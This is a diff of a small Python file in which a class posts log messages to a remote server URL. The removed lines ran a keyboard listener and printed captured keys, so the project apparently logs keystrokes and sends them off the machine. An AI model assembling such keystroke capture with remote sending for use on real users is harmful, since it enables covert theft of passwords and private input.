@@ -1,27 +1,17 @@
 import requests
-from Keyboard import KeyBoard
+from datetime import datetime
+
 
 class WritingToTheServer:
 
     def __init__(self, server_url):
         self.server_url = server_url
 
-
-    def create_file(self,d,s = "n.txt"):
-        with open(s, 'w', encoding='utf-8') as file:
-            file.write(d)
-        print("secseful")
+    def get_current_time(self):
+        return datetime.now()
 
     def send_log(self, message):
-        data = {"message": message}
+        data = {"message": message}#now need to send that with time
         headers = {"Content-Type": "application/json"}
-        response = requests.post(self.server_url, json=data,headers=headers)
+        response = requests.post(self.server_url, json=data, headers=headers)
         print(response.json())
-
-keyBord = KeyBoard()
-keyBord.start_listening()
-
-input("Press Enter to stop listening...\n")
-keyBord.stop_listening()
-
-print(keyBord.get_listen_keys())
